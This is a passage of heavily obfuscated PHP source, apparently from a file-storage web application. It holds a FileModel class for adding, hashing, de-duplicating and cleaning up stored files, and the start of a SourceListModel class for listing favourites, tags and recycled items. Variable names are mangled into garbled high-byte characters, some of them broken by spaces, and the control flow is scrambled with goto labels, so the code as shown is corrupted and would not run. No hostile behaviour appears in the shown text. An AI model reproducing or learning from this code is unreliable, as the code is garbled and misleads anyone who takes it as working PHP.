$e’ƒ√˜√÷ê[$fÁ∞ºÙ∞Ó˜] = $a≠Âƒ•Í√∞; } goto Eë∆©èé‰Á; eëñìí…∏√: $Dﬁﬁ«êÃÜè =& $_SERVER[∞„˜ƒÑºª]; if (!$F∂…Ã◊úÇ€) { return array(); } $a¯äú∆Û”« = array($Dﬁﬁ«êÃÜè[1554] => array($Dﬁﬁ«êÃÜè[7], $F∂…Ã◊úÇ€)); goto B≈–¥ŒæÁå; Eë∆©èé‰Á: return $e’ƒ√˜√÷ê ? $e’ƒ√˜√÷ê : array(); goto aœïè≈û„™; aœïè≈û„™: } } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\x6c\x65"; public function addFileByContent($dèß≠◊∞ƒÎ = '', $a¡¶µŒÒ®° = '') { goto cÙüΩ©ú¥ù; aÊÆòΩÂÿï: $bÕ≈∞≈©⁄Ê = $d‡›µõùæ¶ . $cÖÿ∫‡∂Î…[1565] . rand_string(16); file_put_contents($bÕ≈∞≈©⁄Ê, $dèß≠◊∞ƒÎ); $bÉêª≈‚Ï = $this->addFile($bÕ≈∞≈©⁄Ê, $a¡¶µŒÒ®°, !0); goto d°Œ„±Çî€; d°Œ„±Çî€: if (file_exists($bÕ≈∞≈©⁄Ê)) { @unlink($bÕ≈∞≈©⁄Ê); } return $bÉêª≈‚Ï; goto Bé¨Ì¿˜‚—; cÙüΩ©ú¥ù: $cÖÿ∫‡∂Î… =& $_SERVER[∞„˜ƒÑºª]; $d‡›µõùæ¶ = TEMP_PATH . $cÖÿ∫‡∂Î…[1564]; if (!is_dir($d‡›µõùæ¶)) { mk_dir($d‡›µõùæ¶); } goto aÊÆòΩÂÿï; Bé¨Ì¿˜‚—: } public function createFileName($eÃ‘«àÖûÉ) { goto E√É”∆Í»Ò; f©—„¢ÔŸ∏: if (!$Bâ≠”√ñµÜ && !Cache::get($b˜‰®ù¬·ü)) { $Bâ≠”√ñµÜ = !0; $f©ûâ»íŒ◊ = IO::mkdir($aáÈÁ´Ö≠î); if (!IO::exist($f©ûâ»íŒ◊ . $EÇı¡¬ßØ¬[1567])) { IO::mkfile($f©ûâ»íŒ◊ . $EÇı¡¬ßØ¬[1567]); } Cache::set($b˜‰®ù¬·ü, 1, 3600 * 2); } return $B§é•ïïù; goto FÙ¥Á‹®óÇ; fç›•É¿á®: $aáÈÁ´Ö≠î = $DÁ€‰≈Âñä->pathFather($B§é•ïïù); static $Bâ≠”√ñµÜ = false; $b˜‰®ù¬·ü = $EÇı¡¬ßØ¬[1566] . md5($aáÈÁ´Ö≠î); goto f©—„¢ÔŸ∏; E√É”∆Í»Ò: $EÇı¡¬ßØ¬ =& $_SERVER[∞„˜ƒÑºª]; $DÁ€‰≈Âñä = IO::init($EÇı¡¬ßØ¬[8]); $B§é•ïïù = $this->makeFilePath($eÃ‘«àÖûÉ, $DÁ€‰≈Âñä); goto fç›•É¿á®; FÙ¥Á‹®óÇ: } public function makeFilePath($fπêﬂÛúòΩ, $aº‘∞Ü‹∏∏) { goto D‰ÿ◊¶±à‚; eÊèÓêé™ø: $c¨§êã ‹º = $b´∆ÿ∫çô . rand_string(5) . short_id(100); $fπêﬂÛúòΩ = str_replace($F∫â‘îÑ˜É[8], $F∫â‘îÑ˜É[79], KodIO::clear($fπêﬂÛúòΩ)); if (!$fπêﬂÛúòΩ) { $cﬁ”íáÜûÁ = $F∫â‘îÑ˜É[1570]; } goto dßß“¥¢∆∆; D‰ÿ◊¶±à‚: $F∫â‘îÑ˜É =& $_SERVER[∞„˜ƒÑºª]; $cﬁ”íáÜûÁ = Model($F∫â‘îÑ˜É[812])->get($F∫â‘îÑ˜É[1568]); $b´∆ÿ∫çô = KodIO::defaultIO() . date($F∫â‘îÑ˜É[1569]); goto eÊèÓêé™ø; dßß“¥¢∆∆: switch ($cﬁ”íáÜûÁ) { case $F∫â‘îÑ˜É[1571]: $c¨§êã ‹º = $c¨§êã ‹º . $F∫â‘îÑ˜É[98] . $aº‘∞Ü‹∏∏->ext($fπêﬂÛúòΩ); if ($aº‘∞Ü‹∏∏->ext($fπêﬂÛúòΩ) == $F∫â‘îÑ˜É[1506]) { $c¨§êã ‹º .= $F∫â‘îÑ˜É[1572]; } break; case $F∫â‘îÑ˜É[1573]: goto AØÎò√àﬂÿ; CàèÁ©∫âÙ: if ($aº‘∞Ü‹∏∏->ext($fπêﬂÛúòΩ) == $F∫â‘îÑ˜É[1506]) { $fπêﬂÛúòΩ .= $F∫â‘îÑ˜É[1572]; } $cƒµé∆ ‡“ = IO::fileNameAuto($b´∆ÿ∫çô, $fπêﬂÛúòΩ); $c¨§êã ‹º = $b´∆ÿ∫çô . $cƒµé∆ ‡“; goto cÉÏÚÒù“º; cÉÏÚÒù“º: break; goto aøßﬂèáﬂ¿; AØÎò√àﬂÿ: $C´≥◊Ç¡æı = Model($F∫â‘îÑ˜É[812])->get($F∫â‘îÑ˜É[1574]); $CÇä¶¨ºÂ∞ = substr(md5($F∫â‘îÑ˜É[1279] . $C´≥◊Ç¡æı . date($F∫â‘îÑ˜É[443])), 0, 8); $b´∆ÿ∫çô = KodIO::defaultIO() . date($F∫â‘îÑ˜É[1575]) . $CÇä¶¨ºÂ∞ . $F∫â‘îÑ˜É[8]; goto CàèÁ©∫âÙ; aøßﬂèáﬂ¿: case $F∫â‘îÑ˜É[1570]: break; default: break; } return $c¨§êã ‹º; goto aË±’êÿ◊¥; aË±’êÿ◊¥: } public function addFileByRemote($c¿á¥‹ü ì, $C”Ü•Ω ¥…, $aÒƒª≠∑ÙÃ = array()) { goto dÖÇüÀë◊¢; c∫›”ƒ≠‹Ì: $c√ÒÈÃ–•„ = IO::hashMd5($c¿á¥‹ü ì, $d««©„¬Ø±); $F‰Í≈¬≥Ì£ = KodIO::defaultDriver(); $B¥Á´¯ÕÒ¨ = array($fÃ–Íë∆é„[391] => IO::size($c¿á¥‹ü ì), $fÃ–Íë∆é„[1576] => 1, $fÃ–Íë∆é„[387] => $C”Ü•Ω ¥…, $fÃ–Íë∆é„[503] => $F‰Í≈¬≥Ì£[$fÃ–Íë∆é„[366]], $fÃ–Íë∆é„[1577] => $c¿á¥‹ü ì, $fÃ–Íë∆é„[1578] => $aÒƒª≠∑ÙÃ[$fÃ–Íë∆é„[160]] ? $aÒƒª≠∑ÙÃ[$fÃ–Íë∆é„[160]] : IO::hashSimple($c¿á¥‹ü ì), $fÃ–Íë∆é„[1579] => $c√ÒÈÃ–•„ ? $c√ÒÈÃ–•„ : $d««©„¬Ø±); goto fæÆÑû¿è¬; dÖÇüÀë◊¢: $fÃ–Íë∆é„ =& $_SERVER[∞„˜ƒÑºª]; if (!IO::exist($c¿á¥‹ü ì)) { return !1; } $d««©„¬Ø± = $aÒƒª≠∑ÙÃ[$fÃ–Íë∆é„[159]] ? $aÒƒª≠∑ÙÃ[$fÃ–Íë∆é„[159]] : $fÃ–Íë∆é„[33]; goto c∫›”ƒ≠‹Ì; fæÆÑû¿è¬: if ($EÙé˘‹÷øæ = $this->addFileCheckExist($B¥Á´¯ÕÒ¨[$fÃ–Íë∆é„[160]], $B¥Á´¯ÕÒ¨[$fÃ–Íë∆é„[159]], $B¥Á´¯ÕÒ¨[$fÃ–Íë∆é„[86]])) { return $EÙé˘‹÷øæ; } $E¬µ√∂√àç = $this->add($B¥Á´¯ÕÒ¨); return $this->find($E¬µ√∂√àç); goto AπÊ’µ“º±; AπÊ’µ“º±: } public function addFile($Dã≤Ñ¢ßè•, $eÂ˜âˆÓà™, $C™®≈≠® ‡ = false) { goto BåØÚî‚ûÏ; BåØÚî‚ûÏ: $dÈ•Æ©Œ ò = IO::hashSimple($Dã≤Ñ¢ßè•); $c∑íôÇµé≤ = IO::hashMd5($Dã≤Ñ¢ßè•); $A£ÀÔ©∂ Ñ = IO::size($Dã≤Ñ¢ßè•); goto cÁ⁄›ˆ¬Ï∫; aÍäÓ´áì–: $DÓ¿–≤ıîë = $this->find($f©ââ≈∏ﬂœ); return $DÓ¿–≤ıîë; goto aπàòáòÉƒ; cÁ⁄›ˆ¬Ï∫: if ($DÓ¿–≤ıîë = $this->addFileCheckExist($dÈ•Æ©Œ ò, $c∑íôÇµé≤, $A£ÀÔ©∂ Ñ)) { return $DÓ¿–≤ıîë; } $aàÇÂ‚ÜË£ = $this->addFileMake($Dã≤Ñ¢ßè•, $A£ÀÔ©∂ Ñ, $dÈ•Æ©Œ ò, $c∑íôÇµé≤, $eÂ˜âˆÓà™, $C™®≈≠® ‡); $f©ââ≈∏ﬂœ = $this->add($aàÇÂ‚ÜË£); goto aÍäÓ´áì–; aπàòáòÉƒ: } public function addFileMake($b≤»à◊ÀÓà, $cÌ¢Ç⁄„«ù, $b⁄‹Ñúà¢æ, $fà€çı©ô˘, $f≠¶ ÷ìæé, $F„ıœä°Àé) { $C®“È¢Àƒç =& $_SERVER[∞„˜ƒÑºª]; $Eô √ïäÜ∂ = $this->createFileName($f≠¶ ÷ìæé); if ($F„ıœä°Àé) { IO::move($b≤»à◊ÀÓà, $Eô √ïäÜ∂); } else { IO::copy($b≤»à◊ÀÓà, $Eô √ïäÜ∂); } $e™ùäõ ›Ü = KodIO::defaultDriver(); $B®àì›°Ì∞ = array($C®“È¢Àƒç[391] => $cÌ¢Ç⁄„«ù, $C®“È¢Àƒç[1576] => 1, $C®“È¢Àƒç[387] => $f≠¶ ÷ìæé, $C®“È¢Àƒç[503] => $e™ùäõ ›Ü[$C®“È¢Àƒç[366]], $C®“È¢Àƒç[1577] => $Eô √ïäÜ∂, $C®“È¢Àƒç[1578] => $b⁄‹Ñúà¢æ, $C®“È¢Àƒç[1579] => $fà€çı©ô˘); return $B®àì›°Ì∞; } public function addFileCheckExist($cáΩ“˜°Ôß, $cπ°≤ÜÌêî, $Fæ›ù∫Âã≠) { $e‘éÇﬁØê• =& $_SERVER[∞„˜ƒÑºª]; $CŸ’†ˆúïë = $this->findByHash($cáΩ“˜°Ôß, $cπ°≤ÜÌêî); if (!$CŸ’†ˆúïë) { return !1; } $f…ƒ¡ä’∆Ó = array($e‘éÇﬁØê•[1576] => intval($CŸ’†ˆúïë[$e‘éÇﬁØê•[1580]]) + 1, $e‘éÇﬁØê•[391] => $Fæ›ù∫Âã≠); $this->where(array($e‘éÇﬁØê•[390] => $CŸ’†ˆúïë[$e‘éÇﬁØê•[382]]))->save($f…ƒ¡ä’∆Ó); return $CŸ’†ˆúïë; } public function remove($B√µã‰ﬁ¡É) { $this->linkCountChange($B√µã‰ﬁ¡É, !1); $this->clearEmpty(); return !0; } public function linkAdd($F‡Éƒ¨É´ê) { $this->linkCountChange($F‡Éƒ¨É´ê, !0); } public function linkCountChange($EØë¥Â‰ë, $Dàä´ñÇêó) { goto f€òåæ˘á◊; f‹≠æúçÀΩ: foreach ($cíÛ¢ÃÊ›ö as $dœú¨œûÑ† => $E„ÉàÈÍë›) { $d‰ÀáÖπ¥√ = $E„ÉàÈÍë› . $c‹ãá†øü‰[33]; if (!$DàŸÕ™Èèπ[$d‰ÀáÖπ¥√]) { $DàŸÕ™Èèπ[$d‰ÀáÖπ¥√] = array(); } $DàŸÕ™Èèπ[$d‰ÀáÖπ¥√][] = $dœú¨œûÑ†; } foreach ($DàŸÕ™Èèπ as $E„ÉàÈÍë› => $CÃ≈∑¯ôﬁπ) { $E„ÉàÈÍë› = $Dàä´ñÇêó ? $E„ÉàÈÍë› : -intval($E„ÉàÈÍë›); if (!$CÃ≈∑¯ôﬁπ) { continue; } $DŒîÀü‡ö¨ = array($c‹ãá†øü‰[382] => array($c‹ãá†øü‰[7], $CÃ≈∑¯ôﬁπ)); if ($E„ÉàÈÍë› < 0) { $DŒîÀü‡ö¨[$c‹ãá†øü‰[1580]] = array($c‹ãá†øü‰[689], abs($E„ÉàÈÍë›)); } $this->where($DŒîÀü‡ö¨)->setAdd($c‹ãá†øü‰[1580], $E„ÉàÈÍë›); } goto C˜ëì€·‡ë; f€òåæ˘á◊: $c‹ãá†øü‰ =& $_SERVER[∞„˜ƒÑºª]; if (!$EØë¥Â‰ë) { return; } if (!is_array($EØë¥Â‰ë)) { $EØë¥Â‰ë = array($EØë¥Â‰ë); } goto f∑Ú±Ù¿Ù√; f∑Ú±Ù¿Ù√: $cíÛ¢ÃÊ›ö = array(); foreach ($EØë¥Â‰ë as $dœú¨œûÑ†) { $d‰ÀáÖπ¥√ = $dœú¨œûÑ† . $c‹ãá†øü‰[33]; if (!$cíÛ¢ÃÊ›ö[$d‰ÀáÖπ¥√]) { $cíÛ¢ÃÊ›ö[$d‰ÀáÖπ¥√] = 0; } $cíÛ¢ÃÊ›ö[$d‰ÀáÖπ¥√]++; } $DàŸÕ™Èèπ = array(); goto f‹≠æúçÀΩ; C˜ëì€·‡ë: } public function findByHash($FÂÛ§„øÜ‰, $a≠«èã≥öâ = false) { $a»ÎàêÇï÷ =& $_SERVER[∞„˜ƒÑºª]; $c§Í‰çù∆∆ = array($a»ÎàêÇï÷[1578] => $FÂÛ§„øÜ‰); if ($a≠«èã≥öâ) { $c§Í‰çù∆∆ = array($a»ÎàêÇï÷[1579] => $a≠«èã≥öâ); } return $this->order($a»ÎàêÇï÷[1581])->where($c§Í‰çù∆∆)->find(); } public function clearEmpty($C¢∞ÓÿÖ◊· = 0) { goto eÃ™«‹Ö∑«; eÃ™«‹Ö∑«: $fàÊâ§±—Î =& $_SERVER[∞„˜ƒÑºª]; $Aß≈¶’÷öà = time() - 3600 * 24 * $C¢∞ÓÿÖ◊·; $bûå≈…Üêç = $fàÊâ§±—Î[1582] . $Aß≈¶’÷öà; goto cÜ¶åÖŒ•’; e†”¬…üÃœ: foreach ($Eõ€“ˆ€öÖ as $Cñ€”ü‡π◊) { $FùñÏëù„„->update(1); $this->resetFile($Cñ€”ü‡π◊); } $FùñÏëù„„->end(); goto Fá—°†πÂ´; cÜ¶åÖŒ•’: $Eõ€“ˆ€öÖ = $this->where($bûå≈…Üêç)->select(); if (!$Eõ€“ˆ€öÖ) { return; } $FùñÏëù„„ = new Task($fàÊâ§±—Î[1583], $fàÊâ§±—Î[33], count($Eõ€“ˆ€öÖ)); goto e†”¬…üÃœ; Fá—°†πÂ´: } public function refreshData() { goto f€«»úÑÆ‡; aã‰åúè Ã: if (!$f¥£ºëÑŒ∞) { return; } $BãêÕ¥Ë”¯ = new Task($BÌèæ™åãç[1584], $BÌèæ™åãç[33], count($f¥£ºëÑŒ∞)); foreach ($f¥£ºëÑŒ∞ as $dÎÕÖ—ßπ—) { $BãêÕ¥Ë”¯->update(1); if ($this->removeNotExist($dÎÕÖ—ßπ—)) { continue; } $this->resetFile($dÎÕÖ—ßπ—); } goto a∏…ˆÃâîæ; f€«»úÑÆ‡: $BÌèæ™åãç =& $_SERVER[∞„˜ƒÑºª]; $this->refreshSourceHistory(); $f¥£ºëÑŒ∞ = $this->select(); goto aã‰åúè Ã; a∏…ˆÃâîæ: $BãêÕ¥Ë”¯->end(); $this->clearEmpty(); goto E¨Ãé™¬≥∂; E¨Ãé™¬≥∂: } private function resetFile($eâ∂ã≥Ù“Ç) { goto C‚Œ™÷ºß“; C‚Œ™÷ºß“: $C‚∆»∂Æ¬Ç =& $_SERVER[∞„˜ƒÑºª]; $B¯€∆øõ≠ÿ = array($C‚∆»∂Æ¬Ç[390] => $eâ∂ã≥Ù“Ç[$C‚∆»∂Æ¬Ç[382]]); $cªà‹©¢Îï = Model($C‚∆»∂Æ¬Ç[832])->where($B¯€∆øõ≠ÿ)->count(); goto bˆÕ˜üπ∫˜; bˆÕ˜üπ∫˜: $f›±çò∂çπ = Model($C‚∆»∂Æ¬Ç[1585])->where($B¯€∆øõ≠ÿ)->count(); $f…ª∂ÉÑò— = intval($cªà‹©¢Îï) + intval($f›±çò∂çπ); if ($f…ª∂ÉÑò— == 0) { IO::remove($eâ∂ã≥Ù“Ç[$C‚∆»∂Æ¬Ç[84]]); $this->where($B¯€∆øõ≠ÿ)->delete(); return; } goto BΩ≥¿ç…ÇÆ; BΩ≥¿ç…ÇÆ: if ($eâ∂ã≥Ù“Ç[$C‚∆»∂Æ¬Ç[1580]] != $f…ª∂ÉÑò—) { $this->where($B¯€∆øõ≠ÿ)->save(array($C‚∆»∂Æ¬Ç[1576] => $f…ª∂ÉÑò—)); } goto B≠ñÇë„õ; B≠ñÇë„õ: } private function removeNotExist($a†øãÊÌ√±) { goto B„õÖÉ‚äÑ; B„õÖÉ‚äÑ: $E≤Ö¥°À÷∂ =& $_SERVER[∞„˜ƒÑºª]; if (IO::exist($a†øãÊÌ√±[$E≤Ö¥°À÷∂[84]])) { return !1; } $this->remove($a†øãÊÌ√±[$E≤Ö¥°À÷∂[382]]); goto aÓó±ï‰ßÓ; aÓó±ï‰ßÓ: $e‘…¨¬Ÿ†ì = array($E≤Ö¥°À÷∂[390] => $a†øãÊÌ√±[$E≤Ö¥°À÷∂[382]]); Model($E≤Ö¥°À÷∂[832])->where($e‘…¨¬Ÿ†ì)->delete(); Model($E≤Ö¥°À÷∂[1585])->where($e‘…¨¬Ÿ†ì)->delete(); goto A©ÈØ∂∂±ê; A©ÈØ∂∂±ê: return !0; goto c»µÒ‚´üâ; c»µÒ‚´üâ: } private function refreshSourceHistory() { $cíÉÉØ¶ìâ =& $_SERVER[∞„˜ƒÑºª]; $e≥≠àñÜﬁË = Model($cíÉÉØ¶ìâ[1586])->select(); if (!$e≥≠àñÜﬁË) { return; } foreach ($e≥≠àñÜﬁË as $d·›‘É¿≤”) { $aë“≥€‹¶‹ = array($cíÉÉØ¶ìâ[414] => $d·›‘É¿≤”[$cíÉÉØ¶ìâ[374]]); if (!Model($cíÉÉØ¶ìâ[832])->where($aë“≥€‹¶‹)->find()) { Model($cíÉÉØ¶ìâ[1586])->where($aë“≥€‹¶‹)->delete(); } } } public function storageInfo($fõÉ∂ƒ·∞≤ = false) { goto FÉáë¶Àﬁ ; FÉáë¶Àﬁ : $a∆£É‚≠ïÎ =& $_SERVER[∞„˜ƒÑºª]; $Fﬁé≈ê…î = $this->count() + 0.0; $aâ†ê¿∫ê‘ = 0; goto eÓ≈ªâµê°; eÓ≈ªâµê°: $dÛÀèêçÂÉ = 1; $E–ãÃ›”¯ä = 0; $F≤ùÃÙùœÛ = 5000; goto C®®Õÿ∫˘¨; C®®Õÿ∫˘¨: for ($fƒ≥™‡‚ˆ≠ = 0; $fƒ≥™‡‚ˆ≠ < $Fﬁé≈ê…î; $fƒ≥™‡‚ˆ≠ = $fƒ≥™‡‚ˆ≠ + $F≤ùÃÙùœÛ) { $BÙ◊Ô∆¬Áﬁ = $this->limit($fƒ≥™‡‚ˆ≠, $fƒ≥™‡‚ˆ≠ + $F≤ùÃÙùœÛ)->select(); foreach ($BÙ◊Ô∆¬Áﬁ as $føå‡”å∑í) { $dÛÀèêçÂÉ += $føå‡”å∑í[$a∆£É‚≠ïÎ[86]] * $føå‡”å∑í[$a∆£É‚≠ïÎ[1580]]; $aâ†ê¿∫ê‘ += $føå‡”å∑í[$a∆£É‚≠ïÎ[86]] * ($føå‡”å∑í[$a∆£É‚≠ïÎ[1580]] - 1); $E–ãÃ›”¯ä += $føå‡”å∑í[$a∆£É‚≠ïÎ[1580]]; } } $F¨ÒÆçãƒ© = array($a∆£É‚≠ïÎ[1587] => $dÛÀèêçÂÉ, $a∆£É‚≠ïÎ[1588] => $aâ†ê¿∫ê‘, $a∆£É‚≠ïÎ[1589] => $aâ†ê¿∫ê‘ / $dÛÀèêçÂÉ, $a∆£É‚≠ïÎ[90] => $Fﬁé≈ê…î, $a∆£É‚≠ïÎ[1590] => $E–ãÃ›”¯ä); return $F¨ÒÆçãƒ©; goto cÑáúÛ™”í; cÑáúÛ™”í: } } goto BûÕÛıí‰÷; Aﬂ¿◊≤≠Ñã: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\x72\x63\145"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\x61\x6d\145" => "\x69\x6f\x5f\163\x6f\x75\162\143\145\x5f\x6d\x65\164\141", "\155\145\164\141\106\x69\145\x6c\x64" => "\163\157\165\162\143\145\x49\104"); protected $dataAuto = array(array("\155\157\x64\x69\x66\171\124\x69\x6d\x65", "\x74\151\155\x65", "\x69\x6e\163\145\162\164", "\146\165\x6e\143\164\151\x6f\x6e"), array("\143\x72\x65\141\x74\145\x54\151\155\x65", "\x74\x69\155\145", "\151\156\x73\x65\162\164", "\146\165\x6e\143\164\x69\x6f\x6e"), array("\x76\151\x65\x77\124\x69\155\x65", "\164\x69\155\x65", "\x69\156\x73\145\x72\164", "\146\165\x6e\x63\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($c‡®Ø£˜£◊) { return $this->listSource(array($_SERVER[á≠«ÈüÊıæ¸›][0] => $c‡®Ø£˜£◊)); } public function typeName($D”ΩûŒèäÍ) { static $D’·ñµ±«ë = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\145\155", self::TYPE_USER => "\x75\x73\145\162", self::TYPE_GROUP => "\x67\162\x6f\x75\x70"); return $D’·ñµ±«ë[$D”ΩûŒèäÍ . $_SERVER[á≠«ÈüÊıæ¸›][1]]; } public function sourceListInfo($BÕåÁäÓ≤É, $EﬂÎòµâ– = false) { goto D–∆¿ﬁ¿ÌÓ; aó°îóÈ¿º: if (!$EﬂÎòµâ–) { $this->_listAppendMeta($C÷åΩç¥îÆ, $BÕåÁäÓ≤É); $this->_listAppendChildren($C÷åΩç¥îÆ, $BÕåÁäÓ≤É); } $this->_listAppendUser($C÷åΩç¥îÆ); $this->_listAppendPath($C÷åΩç¥îÆ); goto fõáï∞ÑÁÇ; B†ÆÌ€⁄¶ê: $C÷åΩç¥îÆ = $this->where(array($b¶Çë√≤€™[2] => array($b¶Çë√≤€™[3], $BÕåÁäÓ≤É)))->select(); $this->_listAppendAuth($C÷åΩç¥îÆ); $this->_listAppendSourceInfo($C÷åΩç¥îÆ, $BÕåÁäÓ≤É); goto aó°îóÈ¿º; D–∆¿ﬁ¿ÌÓ: $b¶Çë√≤€™ =& $_SERVER[á≠«ÈüÊıæ¸›]; $BÕåÁäÓ≤É = array_filter(array_unique($BÕåÁäÓ≤É)); if (!$BÕåÁäÓ≤É) { return array(); } goto B†ÆÌ€⁄¶ê; fõáï∞ÑÁÇ: foreach ($C÷åΩç¥îÆ as &$b§Ì∑éóôÑ) { $b§Ì∑éóôÑ = $this->pathInfoFilter($b§Ì∑éóôÑ); } $F∞ïÍ¨œÔı = array_to_keyvalue($C÷åΩç¥îÆ, $b¶Çë√≤€™[2]); return $F∞ïÍ¨œÔı; goto CÌ◊«Û§•≤; CÌ◊«Û§•≤: } public function pathInfoFilter($dïœÓÁÜΩÃ) { goto eÏ‚ç§ÜŒ„; e•«¨ü≥¬: $AÙÖ⁄Ω±ÎÀ .= $FºΩ»‹ªˆå[13]; $AÙÖ⁄Ω±ÎÀ .= $FºΩ»‹ªˆå[14]; $fÜŒ‚–ùøã = explode($FºΩ»‹ªˆå[15], $AÙÖ⁄Ω±ÎÀ); goto Aéí£Ù•≠¬; AéÜúîæŒÓ: $dïœÓÁÜΩÃ[$FºΩ»‹ªˆå[9]] = $this->typeName($dïœÓÁÜΩÃ[$FºΩ»‹ªˆå[9]]); if ($dïœÓÁÜΩÃ[$FºΩ»‹ªˆå[6]] != 1) { $dïœÓÁÜΩÃ[$FºΩ»‹ªˆå[10]] = $dïœÓÁÜΩÃ[$FºΩ»‹ªˆå[11]]; unset($dïœÓÁÜΩÃ[$FºΩ»‹ªˆå[11]]); } $AÙÖ⁄Ω±ÎÀ = $FºΩ»‹ªˆå[12]; goto e•«¨ü≥¬; Aéí£Ù•≠¬: if ($dïœÓÁÜΩÃ[$FºΩ»‹ªˆå[16]] && $dïœÓÁÜΩÃ[$FºΩ»‹ªˆå[16]][$FºΩ»‹ªˆå[17]] == -1) { $fÜŒ‚–ùøã = array_remove_value($fÜŒ‚–ùøã, $FºΩ»‹ªˆå[18]); $fÜŒ‚–ùøã = array_remove_value($fÜŒ‚–ùøã, $FºΩ»‹ªˆå[19]); $fÜŒ‚–ùøã = array_remove_value($fÜŒ‚–ùøã, $FºΩ»‹ªˆå[20]); $fÜŒ‚–ùøã = array_remove_value($fÜŒ‚–ùøã, $FºΩ»‹ªˆå[21]); $fÜŒ‚–ùøã = array_remove_value($fÜŒ‚–ùøã, $FºΩ»‹ªˆå[22]); $fÜŒ‚–ùøã = array_remove_value($fÜŒ‚–ùøã, $FºΩ»‹ªˆå[23]); } $dïœÓÁÜΩÃ = array_field_key($dïœÓÁÜΩÃ, $fÜŒ‚–ùøã); return $dïœÓÁÜΩÃ; goto bµ≥¢≥Ø‚ã; eÏ‚ç§ÜŒ„: $FºΩ»‹ªˆå =& $_SERVER[á≠«ÈüÊıæ¸›]; $dïœÓÁÜΩÃ[$FºΩ»‹ªˆå[4]] = KodIO::make($dïœÓÁÜΩÃ[$FºΩ»‹ªˆå[2]]); $dïœÓÁÜΩÃ[$FºΩ»‹ªˆå[5]] = $dïœÓÁÜΩÃ[$FºΩ»‹ªˆå[6]] == 1 ? $FºΩ»‹ªˆå[7] : $FºΩ»‹ªˆå[8]; goto AéÜúîæŒÓ; bµ≥¢≥Ø‚ã: } public function listUserFav() { goto aéöÎŸ∞’Ç; aÖÍæÃÈ ÿ: $D…ÜøÏ’∞ê = array_to_keyvalue($D…ÜøÏ’∞ê, $F¨“ã¨Á ë[1], $F¨“ã¨Á ë[4]); if ($D…ÜøÏ’∞ê) { $Aú≤≠¯€ª— = $this->listSource(array($F¨“ã¨Á ë[26] => array($F¨“ã¨Á ë[27], $D…ÜøÏ’∞ê))); } $Aú≤≠¯€ª— = array_to_keyvalue($Aú≤≠¯€ª—[$F¨“ã¨Á ë[28]], $F¨“ã¨Á ë[2]); goto F˜ªâ¯õÀ‰; aéöÎŸ∞’Ç: $F¨“ã¨Á ë =& $_SERVER[á≠«ÈüÊıæ¸›]; $cîÖúŸ˘∆¨ = Model($F¨“ã¨Á ë[24])->listData(); $D…ÜøÏ’∞ê = array_filter_by_field($cîÖúŸ˘∆¨, $F¨“ã¨Á ë[5], $F¨“ã¨Á ë[25]); goto aÖÍæÃÈ ÿ; F˜ªâ¯õÀ‰: foreach ($cîÖúŸ˘∆¨ as &$D⁄⁄ºí√∏˘) { $D⁄⁄ºí√∏˘ = array($F¨“ã¨Á ë[29] => $D⁄⁄ºí√∏˘[$F¨“ã¨Á ë[30]], $F¨“ã¨Á ë[31] => $D⁄⁄ºí√∏˘[$F¨“ã¨Á ë[32]], $F¨“ã¨Á ë[33] => $D⁄⁄ºí√∏˘[$F¨“ã¨Á ë[4]], $F¨“ã¨Á ë[34] => $D⁄⁄ºí√∏˘[$F¨“ã¨Á ë[5]], $F¨“ã¨Á ë[35] => $D⁄⁄ºí√∏˘[$F¨“ã¨Á ë[18]], $F¨“ã¨Á ë[36] => $D⁄⁄ºí√∏˘[$F¨“ã¨Á ë[19]]); if ($D⁄⁄ºí√∏˘[$F¨“ã¨Á ë[5]] == $F¨“ã¨Á ë[25] && $Aú≤≠¯€ª—[$D⁄⁄ºí√∏˘[$F¨“ã¨Á ë[4]]]) { $D⁄⁄ºí√∏˘[$F¨“ã¨Á ë[37]] = $Aú≤≠¯€ª—[$D⁄⁄ºí√∏˘[$F¨“ã¨Á ë[4]]]; } } return $cîÖúŸ˘∆¨; goto Aﬁùê«å«£; Aﬁùê«å«£: } public function listUserTag($eó„”‹ÔõÔ) { goto C£¡ãıç∆∑; C£¡ãıç∆∑: $E»èÒìäÆ =& $_SERVER[á≠«ÈüÊıæ¸›]; $Aâ€á∑îÇç = Model($E»èÒìäÆ[38])->listData(); $EÕÿ„ÃÊ— = array_filter_by_field($Aâ€á∑îÇç, $E»èÒìäÆ[39], $eó„”‹ÔõÔ); goto cﬂ§˘Ù„≥ï; eΩ¬Ñ’’Çâ: return $this->listSource($D≠ò¶øóÿô); goto dûëä∂è€Î; cﬂ§˘Ù„≥ï: $EÕÿ„ÃÊ— = array_to_keyvalue($EÕÿ„ÃÊ—, $E»èÒìäÆ[1], $E»èÒìäÆ[4]); if (!$EÕÿ„ÃÊ—) { return array(); } $D≠ò¶øóÿô = array($E»èÒìäÆ[26] => array($E»èÒìäÆ[27], $EÕÿ„ÃÊ—)); goto eΩ¬Ñ’’Çâ; dûëä∂è€Î: } public function listUserRecycle() { $c≥áëõäÖ¯ =& $_SERVER[á≠«ÈüÊıæ¸›]; $eŸ§‹∞ç‡© = Model($c≥áëõäÖ¯[40])->listData(); if (!$eŸ§‹∞ç‡©) { return array(); } $Aƒã∂ÚÀ–è = array($c≥áëõäÖ¯[26] => array($c≥áëõäÖ¯[27], $eŸ§‹∞ç‡©), $c≥áëõäÖ¯[41] => 1); return $this->listSource($Aƒã∂ÚÀ–è); } public function listSource($C≤∫À‚¢ÙÉ, $B»ÔÑ—ñΩü = 3000) { goto a·øúá å; a·øúá å: $b¡ôŸÜπ√Ü =& $_SERVER[á≠«ÈüÊıæ¸›]; if (!isset($C≤∫À‚¢ÙÉ[$b¡ôŸÜπ√Ü[42]])) { $C≤∫À‚¢ÙÉ[$b¡ôŸÜπ√Ü[42]] = 0; } $f◊˜â ﬁ¨µ = $b¡ôŸÜπ√Ü[43]; goto bûÆ∞œµÃ÷; B£É¬⁄¥¬⁄: return $cΩ—áããﬁ∞; goto eÃé¯ªùå…; bûÆ∞œµÃ÷: $cΩ—áããﬁ∞ = $this->field($f◊˜â ﬁ¨µ)->_makeOrder()->where($C≤∫À‚¢ÙÉ)->selectPage($B»ÔÑ—ñΩü); $this->_listDataApply($cΩ—áããﬁ∞[$b¡ôŸÜπ√Ü[28]]); 